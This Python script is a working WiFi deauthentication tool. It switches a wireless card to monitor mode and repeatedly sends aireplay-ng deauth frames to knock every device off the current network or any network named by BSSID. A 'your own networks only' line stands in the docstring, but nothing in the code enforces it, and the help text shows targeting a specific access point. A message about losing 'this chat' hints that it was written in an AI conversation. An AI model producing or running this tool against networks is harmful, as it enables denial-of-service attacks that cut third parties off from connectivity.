#!/usr/bin/env python3
"""deauth — completely kill WiFi at Layer 2. Your own networks only."""

import sys, os, subprocess, time, signal, re

BANNER = """
  deauth — WiFi Layer 2 killer
  disconnects ALL devices from any WiFi network
"""


def log(msg):
    print(
        f"  [{__import__('datetime').datetime.now().strftime('%H:%M:%S')}] {msg}",
        flush=True,
    )


def get_bssid(interface="wlan0"):
    """Get the currently connected AP's BSSID and channel."""
    r = subprocess.run(["iw", "dev", interface, "link"], capture_output=True, text=True)
    bssid = None
    ssid = None
    for line in r.stdout.split("\n"):
        m = re.search(r"Connected to ([0-9a-f:]{17})", line, re.I)
        if m:
            bssid = m.group(1)
        m = re.search(r"SSID:\s*(.+)", line)
        if m:
            ssid = m.group(1)
    return bssid, ssid


def get_channel(bssid, interface="wlan0"):
    """Find the channel the AP is on."""
    r = subprocess.run(
        ["iw", "dev", interface, "scan"], capture_output=True, text=True, timeout=10
    )
    in_bssid = False
    for line in r.stdout.split("\n"):
        if bssid.lower() in line.lower():
            in_bssid = True
        if in_bssid and "freq:" in line:
            freq = int(line.split()[1])
            # Convert frequency to channel
            if 2412 <= freq <= 2484:
                return (freq - 2412) // 5 + 1
            elif 5180 <= freq <= 5825:
                return (freq - 5180) // 5 + 36
            elif freq == 2484:
                return 14
        if in_bssid and "SSID:" in line:
            in_bssid = False
    return None


def deauth(interface="wlan0", target_bssid=None, duration=30, method="mdk4"):
    """Kill WiFi by sending deauth frames."""
    kill_switch = [False]

    def handler(sig, frame):
        log("stopping...")
        kill_switch[0] = True

    signal.signal(signal.SIGINT, handler)

    # Get target info
    if not target_bssid:
        bssid, ssid = get_bssid(interface)
        if not bssid:
            log("not connected to WiFi")
            return
        target_bssid = bssid
        log(f"target: {ssid} ({bssid})")

    channel = get_channel(target_bssid, interface)
    log(f"channel: {channel or 'unknown'}")

    # Start monitor mode
    log("starting monitor mode (WiFi will disconnect)...")
    subprocess.run(["airmon-ng", "start", interface], capture_output=True)
    mon_if = f"{interface}mon"

    # Wait for monitor interface
    time.sleep(2)
    r = subprocess.run(["iwconfig", mon_if], capture_output=True, text=True)
    if "no such device" in r.stderr.lower() or "No such device" in r.stderr:
        # Try alternative name
        r2 = subprocess.run(["iwconfig"], capture_output=True, text=True)
        for line in r2.stdout.split("\n"):
            if "mon" in line:
                mon_if = line.split()[0]
                break

    log(f"monitor interface: {mon_if}")
    time.sleep(1)

    # Send deauth
    log(f"deauth for {duration}s — all WiFi devices will disconnect")

    end = time.time() + duration
    count = 0

    try:
        while time.time() < end and not kill_switch[0]:
            # Use aireplay-ng for targeted deauth
            r = subprocess.run(
                [
                    "aireplay-ng",
                    "-0",
                    "5",
                    "-a",
                    target_bssid,
                    "--ignore-negative-one",
                    mon_if,
                ],
                capture_output=True,
                timeout=10,
            )
            count += 5
            print(f"  {count} deauth frames sent...", end="\r", flush=True)
    except subprocess.TimeoutExpired:
        pass
    except Exception as e:
        log(f"error: {e}")

    # Stop monitor mode
    log("")
    log("stopping monitor mode...")
    subprocess.run(["airmon-ng", "stop", mon_if], capture_output=True)
    subprocess.run(["airmon-ng", "stop", interface], capture_output=True)
    time.sleep(2)

    # Reconnect WiFi
    log("reconnecting WiFi...")
    subprocess.run(["nmcli", "device", "connect", interface], capture_output=True)

    log(f"done — {count} deauth frames sent")
    log("WiFi should reconnect within 15 seconds")


def info():
    """Show nearby WiFi networks."""
    print("\n  Scanning nearby networks...\n")
    r = subprocess.run(
        ["nmcli", "dev", "wifi", "list"], capture_output=True, text=True, timeout=15
    )
    print(r.stdout)


if __name__ == "__main__":
    print(BANNER)
    if "-h" in sys.argv or "--help" in sys.argv:
        print("  usage: python3 deauth.py [bssid] [duration]")
        print("  python3 deauth.py                    kill your current WiFi")
        print("  python3 deauth.py e8:76:40:e1:a3:20   kill a specific network")
        print("  python3 deauth.py --info               list nearby networks")
        print("  ⚠️  YOUR WiFi WILL DISCONNECT DURING ATTACK")
        sys.exit(0)

    if "--info" in sys.argv:
        info()
        sys.exit(0)

    bssid = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].isdigit() else None
    dur = int(sys.argv[1]) if len(sys.argv) > 1 and sys.argv[1].isdigit() else 30
    dur = int(sys.argv[2]) if len(sys.argv) > 2 and sys.argv[2].isdigit() else dur

    print(f"  WiFi will die completely for {dur}s")
    print(f"  You will lose connection to this chat.")
    print()
    time.sleep(2)

    deauth(target_bssid=bssid, duration=dur)
    print()
